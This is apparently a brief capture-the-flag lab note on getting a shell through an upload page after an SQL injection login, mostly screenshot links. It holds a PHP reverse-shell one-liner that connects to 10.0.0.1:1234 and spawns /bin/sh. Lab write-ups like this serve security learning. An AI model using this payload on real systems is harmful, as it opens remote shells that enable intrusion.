# Getting a shell

http://10.10.10.185/upload.php
After SQLi login, we can acess the upload.php page
![[Pasted image 20211204215220.png]]

![[Pasted image 20211204215449.png]]

![[Pasted image 20211204224111.png]]

payload
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
![[Pasted image 20211204224132.png]]



![[Pasted image 20211204224520.png]]